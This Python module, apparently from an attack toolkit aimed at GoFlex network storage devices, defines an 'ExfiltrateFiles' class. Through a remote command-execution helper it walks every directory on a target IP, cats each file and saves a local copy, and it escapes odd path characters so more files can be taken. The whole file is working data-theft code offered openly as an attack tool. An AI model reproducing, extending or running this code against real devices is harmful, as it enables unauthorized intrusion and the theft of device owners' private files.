import os
import re
from pathlib import Path

from config import ROOT_DIR
from goflex_shell.command_executor import CommandExecutor
from wrappers.base_wrapper import BaseCommand
from wrappers.list_dir_info import ListPathInfo, UNICODE_ESCAPED_CHAR, WILDCARD

CAT_COMMAND = '/bin/cat "{}"'


class ExfiltrateFiles(BaseCommand):
    def __init__(self, ip: str):
        super().__init__(ip)
        self.files_exfiltrated = 0

    def execute(self, path: str) -> None:
        for file in ListPathInfo(self.ip).execute(path):
            full_path = Path(path) / file.name

            if file.is_dir:
                print(f"[\t] Folder: {full_path}")

                self.execute(full_path.as_posix())
            else:
                self.files_exfiltrated += 1
                print(f"[{self.files_exfiltrated}\t] File: {full_path}")

                contents = self._exfiltrate_file_content(full_path.as_posix())
                self._write_to_file(str(full_path), contents)

    def _exfiltrate_file_content(self, file_path: str) -> bytes:
        return CommandExecutor.execute(self.ip, self._generate_cat_command(file_path))

    @staticmethod
    def _generate_cat_command(file_path: str) -> str:
        """
        Escapes the path from unprintable characters. For example:

        "something_unicode_?.txt"

        Will become:

        "something_unicode"*".txt"
        """
        escaped_path = UNICODE_ESCAPED_CHAR.sub(WILDCARD, file_path)

        return CAT_COMMAND.format(escaped_path)

    def _write_to_file(self, path: str, data: bytes) -> None:
        relative_path_to_file = self._get_relative_path_from_absolute(ROOT_DIR, path)

        write_path = self._escape_question_marks(relative_path_to_file)

        self._create_dirs(write_path)
        self._write_bytes_to_file(write_path, data)

    @staticmethod
    def _get_relative_path_from_absolute(local_path: str, remote_path: str) -> Path:
        new_path = Path(remote_path.lstrip("\\"))

        relative_path_to_file = local_path / new_path

        return relative_path_to_file

    @staticmethod
    def _create_dirs(file_path: str) -> None:
        try:
            os.makedirs(str(Path(file_path).parent))
        except OSError:
            pass

    @staticmethod
    def _write_bytes_to_file(relative_path_to_file: str, data: bytes) -> None:
        with open(relative_path_to_file, 'wb') as file:
            file.write(data)

    @staticmethod
    def _escape_question_marks(relative_path_to_file: Path) -> str:
        return str(relative_path_to_file).replace("?", "_")